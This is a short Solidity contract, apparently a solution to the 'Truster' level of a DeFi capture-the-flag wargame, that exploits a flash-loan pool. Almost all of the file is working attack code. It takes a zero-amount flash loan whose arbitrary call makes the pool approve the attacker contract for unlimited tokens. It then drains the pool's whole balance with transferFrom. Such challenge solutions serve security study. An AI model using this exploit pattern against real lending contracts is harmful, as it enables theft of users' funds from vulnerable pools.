 // SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/token/ERC20/IERC20.sol"; 

/**
 * @title TrusterAttacker
 * @author Elena (Ellena.xyz@proton.me)
 */ 

 interface TrusterLenderPool {
   function flashLoan( uint256 borrowAmount, address borrower, address target, bytes calldata data ) external;
 }
 contract TrusterAttacker {
   event PoolDrained(address pool, uint poolBalance, uint senderBalance );
  function attack(address _pool, address _token, address attacker) public  {
    
    TrusterLenderPool pool = TrusterLenderPool(_pool);

    IERC20 damnValuableToken = IERC20(_token);

    bytes memory data = abi.encodeWithSignature("approve(address,uint256)", address(this), 2**256-1);

    pool.flashLoan(0, attacker, _token, data );

    damnValuableToken.transferFrom(_pool, attacker, damnValuableToken.balanceOf(_pool) );

    emit PoolDrained(_pool, damnValuableToken.balanceOf(_pool), damnValuableToken.balanceOf(attacker));
    
  }

 }